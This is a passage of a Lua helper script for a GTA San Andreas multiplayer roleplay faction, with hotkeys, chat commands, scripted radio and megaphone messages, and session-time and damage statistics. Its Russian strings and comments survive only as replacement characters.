				--	if isKeyDown(makeHotKey(52)[1]) and piearr.weap.action == 0 and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then wait(0) piearr.weap.pie_mode.v = true imgui.ShowCursor = true else wait(0) piearr.weap.pie_mode.v = false imgui.ShowCursor = false end


				--[[ if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then
					piearr.pie_mode.v = (isKeyDown(makeHotKey(44)[1]) and piearr.action == 0) and true or false
					piearr.weap.pie_mode.v = (isKeyDown(makeHotKey(52)[1]) and piearr.weap.action == 0) and true or false
					imgui.ShowCursor = (piearr.weap.pie_mode.v or piearr.pie_mode.v) and true or false
				end ]]

					-- �������� �� ������ � Pie Menu
					if piearr.action ~= 0 then
							local SB = formatbind(config_ini.UserPieMenuActions[piearr.action])
							if SB ~= nil then for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end end
							piearr.action = 0
					end

					if piearr.weap.action ~= 0 then
						if piearr.weap.action == 1 then hk_45() end
						if piearr.weap.action == 2 then hk_46() end
						if piearr.weap.action == 3 then hk_47() end
						if piearr.weap.action == 4 then hk_48() end
						if piearr.weap.action == 5 then hk_49() end
						if piearr.weap.action == 6 then hk_50() end
						if piearr.weap.action == 7 then hk_51() end
						piearr.weap.action = 0
					end

					if getCharHealth(PLAYER_PED) == 0 and (show.show_dmind.damind.hits[1] ~= 0 or show.show_dmind.damind.shots[1] ~= 0 or show.show_dmind.damind.damage[1] ~= 0) and config_ini.bools[44] == 1 then
						local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� ��������: {ff0000}" .. math.ceil(show.show_dmind.damind.damage[1]) .. ", {fffafa}� ��������: {ff0000}" .. acc .. " {fffafa}���������.", 0xFFFF0000)
						show.show_dmind.damind.shots = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
						show.show_dmind.damind.hits = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
						show.show_dmind.damind.damage = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}

					end
			end
end

 function aa_time()
	local startTime = os.time()                                               							 -- "����� �������"
    local connectingTime = 0
	
    while true do
        wait(1000)
       	 if sampGetGamestate() == 3 then                                                               -- ������� ������ ����� "��������� � �������" (��� �� ������ ������� ������, �����, �� ���������� � �������)
			time_index = time_index + 1	

			ses.online = ses.online + 1
			ses.full = os.time() - startTime
			ses.afk = ses.full - ses.online
			
	        config_ini.day_info.online = config_ini.day_info.online + 1 							 -- ������ �� ������� ��� ����� ���	
	        config_ini.day_info.full = dfuls + ses.full												 -- ����� ������ �� �������
	        config_ini.day_info.afk = config_ini.day_info.full - config_ini.day_info.online			 -- ��� �� �������

	        config_ini.week_info.online = config_ini.week_info.online + 1 							 -- ������ �� ������ ��� ����� ���
	        config_ini.week_info.full = wfuls + ses.full		 									 -- ����� ������ �� ������
	        config_ini.week_info.afk = config_ini.week_info.full - config_ini.week_info.online		 -- ��� �� ������

            config_ini.online[tonumber(os.date('%w', os.time()))] = config_ini.day_info.full		 -- ���������� ������� ������ �� ���� � ��� ����

            connectingTime = 0
			if time_index == 60 then 
				time_index = 0 
				needtosave = true 
			end							 -- �� ������ 60 ������� ���������� ���������� ���
	    else
            connectingTime = connectingTime + 1                         
	    	startTime = startTime + 1									
	    end
    end
end

function cmd_mon()
	if not isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� � ���������.", 0xFFFF0000) return end
	local idc = getCarModel(storeCarCharIsInNoSave(PLAYER_PED))
	if idc ~= 433 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� � ���������.", 0xFFFF0000) return end

	skipd[3][5] = true
	skipd[3][8][1] = true
	sampSendChat("/carm")
end

function cmd_get(sparams)
	lua_thread.create(function()
		if sparams == "guns" or sparams == "fuel" then sampSendChat("/get " .. sparams .. "") return end 
		if show.show_otm.v then  sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��������� �������� ����������� �������.", 0xFFFF0000) return end
		if sparams == "" or (sparams ~= "otm" and sparams ~= "lek") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /get [otm/lek] ��� ��������� ���������� �� ������� ������.", 0xFFFF0000) return end
		if sparams == "lek" and access.alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������ �������������� �����������.", 0xFFFF0000) return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� ������� ������.", 0xFFFF0000)
		if sparams == "otm" then
			show.otm_arr = {}
			local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getotm")
			local otms = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
			if otms == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������� ������.", 0xFFFF0000) return end
			local otmsarr = string.split(otms, "; ")
			local A_Index = 1
			local colorArr = {0xFFCD5C5C, 0xFFDC143C, 0xFFFF69B4, 0xFFDB7093, 0xFFFFA07A, 0xFFFF6347, 0xFFFF8C00, 0xFFFFA500, 0xFFFFFF00, 0xFFFFEFD5, 0xFFADFF2F, 0xFF90EE90, 0xFF228B22, 0xFF808000, 0xFF8FBC8F, 0xFF008080, 0xFF00FFFF, 0xFF4682B4, 0xFF00BFFF, 0xFFEE82EE, 0xFF000080, 0xFF9932CC, 0xFFFFFFFF, 0xFFFFEBCD, 0xFFFDF5E6, 0xFFDAA520, 0xFFDCDCDC, 0xFF8B4513, 0xFF000000, 0xFF8B0000}
			for k, l in ipairs(otmsarr) do
				local n, o = l:match("(.*) %- (.*)")
				if tonumber(o) ~= nil then A_Index = A_Index + 1 table.insert(show.otm_arr, {v = tonumber(o), name = n, color = colorArr[A_Index]}) end		
			end

			for k, l in ipairs(show.otm_arr) do
			end
			show.show_otm.v = true
		end

		if sparams == "lek" then
			local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlek&" .. moderpas .. "")
			local lek = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
			if lek == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������� ������.", 0xFFFF0000) return end
			show.lek_arr = decodeJson(lek)
			show.show_lek.v = true
		end
	end)

	
end

function cmd_toggle()
	skipd[1].obool = not skipd[1].obool
	sampAddChatMessage(skipd[1].obool and "{FF0000}[LUA]: {FFFAFA}������� ������� �������." or "{FF0000}[LUA]: {FFFAFA}������� ������� ��������.", 0xFFFF0000)
end

function cmd_scr(sparams)
	if sparams ~= "exit" then sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������� /scr exit ��� ���������� �������.", 0xFFFF0000) return end
	
	thisScript():unload()	
end

function cmd_dclean()
	local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� ��������: {ff0000}" .. math.ceil(show.show_dmind.damind.damage[1]) .. ", {fffafa}� ��������: {ff0000}" .. acc .. " {fffafa}���������.", 0xFFFF0000)
	show.show_dmind.damind.shots = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
	show.show_dmind.damind.hits = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
	show.show_dmind.damind.damage = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
end

function cmd_s()
		lua_thread.create(
				function()
						for k, v in ipairs(config_ini.HotKey) do local hk = makeHotKey(k) if hk[1] ~= 0 then rkeys.unRegisterHotKey(hk) end end

						for k, v in ipairs(config_ini.Commands) do sampUnregisterChatCommand(v) end

						for k, v in ipairs(config_ini.UserCBinderC) do sampUnregisterChatCommand(v) end

						sampUnregisterChatCommand("commandhelp")
						sampUnregisterChatCommand("bugreport")
						sampUnregisterChatCommand("mkv")
						sampUnregisterChatCommand("bkv")
						sampUnregisterChatCommand("lej")
						sampUnregisterChatCommand("bp")
						sampUnregisterChatCommand("cars")

						if access.alevel > -1 then	sampUnregisterChatCommand("balogin") end
						if access.alevel > 0 then sampUnregisterChatCommand("check") sampUnregisterChatCommand ("lek") sampUnregisterChatCommand("pcheck") sampUnregisterChatCommand("tren") end
						if access.alevel > 1 then sampUnregisterChatCommand("padd") sampUnregisterChatCommand("pdel") sampUnregisterChatCommand("reg")	sampUnregisterChatCommand("ban") sampUnregisterChatCommand("add") sampUnregisterChatCommand("del") sampUnregisterChatCommand("change") sampUnregisterChatCommand("mark") end
						if access.alevel > 2 then sampUnregisterChatCommand("moder") sampUnregisterChatCommand("otm") sampUnregisterChatCommand("fond") end

						piearr.action = 0
						piearr.pie_mode.v = false -- ����� PieMenu
						piearr.pie_keyid = 0
						piearr.pie_elements = {}

						suspendkeys = 1
						guis.mainw.v = not guis.mainw.v
				end
		)
end

function cmd_duel(sparams)
	if sparams == "-1" then sampSendChat("/me ��������" .. RP .. " �� ��������� ��������") duel.mode = false duel.en.id = -1 return end
	local id = tonumber(sparams)
	local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
	if id == nil or (id < 0 and id > 999) or not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
	if not sampGetCharHandleBySampPlayerId(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ������", 0xFFFF0000) return end
	local n, f = sampGetPlayerNickname(id):match("(.*)%_(.*)")
	sampSendChat("/me ������" .. RP .. " �������� ��� ���� " .. n .. " " .. f .. "")
	duel.mode = true
	duel.en.id = id
	--duel.en.hp = sampGetPlayerHealth(id)
	--duel.en.arm = sampGetPlayerArmor(id)
	--duel.my.hp = sampGetPlayerHealth(myid)
	--duel.my.arm = sampGetPlayerArmor(myid)
end

function cmd_piss()
	sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������!", 0xFFFF0000)
end

function cmd_iznas()
	sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������!", 0xFFFF0000)
end

function hk_1()
		lua_thread.create(
				function()
						sampSetChatInputEnabled(true)
						sampSetChatInputText("/f " .. tag .. " ")
						sampSendChat("/seedo ��������� ����� ������������")
				end
		)
end

function hk_2()
		sampSendChat("/f " .. tag .. " ��������! ��������� ������� �������� ���������! ������� �����!!!")
end

function hk_3()
		lua_thread.create(
				function()
						if not showdialog(1, "���� ��������", "{FFFAFA}[1] - ���������\n[2] - �������������\n[3] - ������� ������� � ��������\n[4] - ������� �������� � ��������\n[5] - �������� ��������� �� ����\n[6] - �������� �������������� � ���������� ����\n[7] - ������� ����/�������\n[0] - ������", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						res = waitForChooseInDialog(1)
						if res == "" then sampSendChat("/f " .. tag .. " �������!") return end
						
						if not res or tonumber(res) == nil or (tonumber(res) < 0 or tonumber(res) > 7) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

						if res == "1" then
								local zzz = {[1] = "��������� ������������", [2] = "��� �������� �������������", [3] = "��� �������� �������������", [4] = "������ �������� �������������", [5] = "���� ��������� �������������", [6] = "����� ��������� �������������", [7] = "���� ��������� �������������", [8] = "������ ��������� �������������", [9] = "������ ��������� �������������", [10] = "������ ��������� �������������"}

								if not showdialog(1, "���������", "���������� ���������. �� 1 �� 10.", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or tonumber(res) == nil or zzz[tonumber(res)] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kol = tonumber(res)

								wait(0)
								if not showdialog(1, "���������", "������� �� �-1 �� �-24", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or tonumber(res) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local b, n = res:match("([�-�])-(%d+)")
								if b == nil or (tonumber(n) < 1 or tonumber(n) > 24) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
								local kv = "" .. b .. "-" .. n .. ""

								wait(0)
								if not showdialog(1, "���������", "�������� ������?\n[1] - ��������(�) ������(�)\n[2] - �������� �� ������\n[3] - ��������� ��������� � ���� �������� ������", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or tonumber(res) == nil or tonumber(res) == 0 or (tonumber(res) < 0 or tonumber(res) > 3) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

								local obdokl = "/f " .. tag .. " " .. zzz[kol] ..  ""
								local obdokl2 = iskv and " � �������� " .. kv .. "." or " ."
								local obdokl3
								if tonumber(res) == 2 then obdokl3 = "" elseif tonumber(res) == 3 or kol == 1 then obdokl3 = " �������� ������" elseif tonumber(res) == 1 and kol > 1 then obdokl3 = " ��������� �������" end
								local dokl = obdokl .. obdokl2 .. obdokl3
								sampSendChat(dokl)
						end

						if res == "2" then
								if not showdialog(1, "������� ����� ����������", "[1] - Los-Santos Police Department\n[2] - San-Fierro Police Department\n[3] - Las-Venturas Police Departmen\n[4] - Federal Bureau of Investigation\n[5] - San-Fierro Army\n[6] - San-Fierro\n[0] - ����� (������� 0)", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 6)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " ������� � ������������� ���") return end
								local arr = {
										["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
										["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
										["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
										["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
										["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
										["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
								}

								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " ������� � ������������� ��� �� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000) end
						end

						if res == "3" then
								if not showdialog(1, "������� ����� ����������", "[1] - Los-Santos Police Department\n[2] - San-Fierro Police Department\n[3] - Las-Venturas Police Departmen\n[4] - Federal Bureau of Investigation\n[5] - San-Fierro Army\n[6] - San-Fierro\n[0] - ����� (������� 0)", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 6)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " ������� �������, ������������.") return end
								local arr = {
										["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
										["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
										["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
										["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
										["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
										["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
								}

								local kv = kvadrat()
								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " ������� ������� � �������� " .. kv .. ", ������������ �� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000) end
						end

						if res == "4" then
								if not showdialog(1, "���� �����(������� �����)", "\n[0] - �����\n[1] - ����\n[2] - Las-Venturas Police Department\n[3] - Los-Santos Police Department\n[4] - San-Fierro Police Department\n[5] - San-Fierro Army\n[6] - Federal Bureau of Investigation\n[7] - San-Fierro", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 7)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kv = kvadrat()
								if tonumber(res) == 0 then lastKV.m = kv sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000) sampSendChat("/f " .. tag .. " ������� ��������, ����� ������") return end
								local arr = {
										["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
										["2"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
										["3"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
										["4"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
										["5"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
										["6"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
										["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
								}


								if arr[res] ~= nil then
										lastKV.m = kv
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000)
										sampSendChat("/f " .. tag .. " ������� �������� � �������� " .. kv .. ", ����� " .. arr[res] .. "")
								else
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000)
								end
						end

						if res == "5" then
								if lastKV.m ~= "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ��������� ��� �� �������� �������� � �������� " .. lastKV.m .. ".", 0xFFFF0000) lastKV.m = "none" end
								if not showdialog(1, "������ ���������", "������� �� �-1 �� �-24", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local b, n = res:match("([�-�])-(%d+)")
								if b == nil or (tonumber(n) < 1 or tonumber(n) > 24) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
								local kv = "" .. b .. "-" .. n .. ""
								sampSendChat("/f " .. tag .. " �������� � �������� " .. kv .. " ��������� �� ����")
						end

						if res == "6" then
								if not showdialog(1, "���� �����(������� �����)", "\n[0] - �����\n[1] - ����\n[2] - Las-Venturas Police Department\n[3] - Los-Santos Police Department\n[4] - San-Fierro Police Department\n[5] - San-Fierro Army\n[6] - Federal Bureau of Investigation\n[7] - San-Fierro", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 7)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " �������� �������������� � ���������� ����") return end
								local arr = {
										["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
										["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
										["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
										["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
										["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
										["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
										["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
								}

								local kv = kvadrat()
								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " �������� �������������� � �������� " .. kv .. " � ���������� ���� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000)	end
						end

						if res == "7" then
								if not showdialog(1, "������� ����/�������", "\n[0] - ������� �������\n[1] - ������� ����", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 1))then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kv = kvadrat()
								if res == "0" then sampSendChat("/f " .. tag .. " ������� " .. kv .. " �������. ���������� ������� ��������������") else sampSendChat("/f " .. tag .. " ������� " .. kv .. " ����. ���������� ������� �� ����������") end
						end						
				end
		)
end

function hk_4()
	lua_thread.create(function()
		local key = CTaskArr["CurrentID"]
		if key == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �� �������.", 0xFFFF0000) return end
		if isKeyDown(makeHotKey(4)[1]) then
			wait(300)
			if isKeyDown(makeHotKey(4)[1]) then goto done end
		end

		if CTaskArr[1][key] == 1 then 
			sampSendChat("/f " .. tag .. " �������, " .. CTaskArr[3][key] .. "!")
			CTaskArr[10][1] = CTaskArr[3][key]
		end
		if CTaskArr[1][key] == 2 then sampSendChat("/f " .. tag .. " �������, " .. CTaskArr[3][key] .. "!") end
		if CTaskArr[1][key] == 3 then sampSendChat("/clist 7") wait(1300) sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[7] .. "") end
		if CTaskArr[1][key] == 4 then sampSendChat("/f " .. tag .. " ������� � ������������� ��� " .. CTaskArr[3][key] .. "") end
		if CTaskArr[1][key] == 5 then sampSendChat("/f " .. tag .. " ����" .. RP .. " ��������, ������ " .. CTaskArr[10][2][1][1] .. ", ���������� �� ��") end
		if CTaskArr[1][key] == 6 then sampSendChat("/f " .. tag .. " ������" .. RP .. " �������� � �����, ������ " .. CTaskArr[3][key] .. "") end
		if CTaskArr[1][key] == 7 then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. CTaskArr[3][key] .. ", " .. CTaskArr[10][3] .. " ����. ") end
		if CTaskArr[1][key] == 8 then sampSendChat("/repairkit") end
		if CTaskArr[1][key] == 9 then sampSendChat("/f " .. tag .. " ����" .. RP .. " ��������, ��� " .. clists[sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))] .. ".") end
		if CTaskArr[1][key] == 10 then sampSendChat("/f " .. tag .. " ������� " .. CTaskArr[3][key] .. " �������. ���������� ������� ��������������") end
		if CTaskArr[1][key] == 11 then sampSendChat("/f " .. tag .. " ������" .. RP .. " ��������.") end
		if CTaskArr[1][key] == 12 then sampSendChat("/report " .. CTaskArr[3][key] .. " ������!") CTaskArr[10][7] = false end
			
		::done::
		CTaskArr[10][7] = false
		table.remove(CTaskArr[1], key)
		table.remove(CTaskArr[2], key)
		table.remove(CTaskArr[3], key)
		CTaskArr["CurrentID"] = 0
		while isKeyDown(0x5D) do wait(0) end
	end)
end

function hk_5()
		lua_thread.create(
				function()
						wait(0)
						sampSendChat("������� �����! " .. config_ini.Settings.PlayerRank .. " " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. "")
						wait(1600)
						sampSendChat("���������� ���� ���������")
				end
		)
end

function hk_6()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						while true do
								if A_Index == 20 then break end
								local text = sampGetChatString(99 - A_Index)

								local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������\\!\\!\\!")
								local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������\\! \\}\\}")
								if re1:match(text) ~= nil or re2:match(text) ~= nil then sampSendChat("" .. c .. " ������ ���������� �� ��������� ���������! ��� �� ������� ����� �� ���������!") return end
								A_Index = A_Index + 1
						-- Aleksandr_Belka �������: ��������! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������!!!
						-- Aleksandr_Belka ������: ��������! ���������� ������������!!!
						-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
						end
						sampSendChat("" .. c .. " ��������! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������!")
				end
		)
end

function hk_7()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						local text = isCharInAnyCar(PLAYER_PED) and "��������, ���������� ������������!" or "������!"
						local text2 = isCharInAnyCar(PLAYER_PED) and "��������, ���������� ������������! ��� �� ������� ����� �� ���������!" or "������! �������� ����!"
						while true do
								if A_Index == 20 then break end
								local ch = sampGetChatString(99 - A_Index)
								local re = regex.new("(.*\\_.* ��������?|\\{\\{ ������ .*\\_.*)\\: (��������, ���������� ������������|������)\\!(\\!\\!| \\}\\})")
								--[[ local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! ���������� ������������\\!\\!\\!")
								local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! ���������� ������������\\! \\}\\}") ]]
								if re:match(ch) ~= nil then sampSendChat("" .. c .. " " .. text2 .. "") return end
								A_Index = A_Index + 1
						-- Aleksandr_Belka �������: ��������! ���������� ������������!!!
						-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
						end
						sampSendChat("" .. c .. " " .. text .. "")
				end
		)
end

function hk_8()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						if not isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
							sampSendChat("" .. c .. " ��������! �� ������ ������� ����������� �������! ��� � �����������, ������� ����� �� ���������!")
						else
							while true do
									if A_Index == 20 then break end
									local text = sampGetChatString(99 - A_Index)
									local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! �� ���������� �� ���������� ����������\\! ���������� �������� �\\!\\!\\!")
									local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! �� ���������� �� ���������� ����������\\! ���������� �������� �\\! \\}\\}")
									if re1:match(text) ~= nil or re2:match(text) ~= nil then sampSendChat("" .. c .. " ������ �������� ���������� ����������! ��� �� ������� ����� �� ���������!") return end
									A_Index = A_Index + 1
							-- Aleksandr_Belka �������: ��������! ���������� ������������!!!
							-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
							end
							sampSendChat("" .. c .. " ��������! �� ���������� �� ���������� ����������! ���������� �������� �!")
						end
				end
		)
end

function hk_9()
		local c = ismegaphone() and "/m" or "/s"
		sampSendChat("" .. c .. " ���� ������! ���� �����, ������� ������, ����� � ���! �������� \"�.�.�.�.\"!")
end

function hk_10()
		lua_thread.create(
				function()
						if not showdialog(1, "����� �����", "0-33", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(1)
						if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 33)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

						local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
						local myclist = clists[sampGetPlayerColor(myid)]
						if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
						if tonumber(res) == myclist then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���� ������ ���� �����.", 0xFFFF0000) return end
